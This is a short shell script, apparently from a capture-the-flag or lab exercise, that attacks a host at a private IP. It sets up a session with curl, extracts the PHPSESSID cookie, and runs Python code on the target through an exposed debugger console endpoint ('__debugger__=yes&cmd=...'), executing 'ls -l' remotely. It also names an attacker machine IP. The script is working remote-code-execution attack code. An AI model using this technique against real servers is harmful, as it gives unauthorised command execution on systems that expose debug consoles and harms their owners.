#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:86" -c "/work/cookie-id.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/cookie-id.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Sending python script
echo "2 - Sending python script to list files"
curl -s -X GET "http://$target_ip:86/console?__debugger__=yes&cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())" > /work/5-ls.html
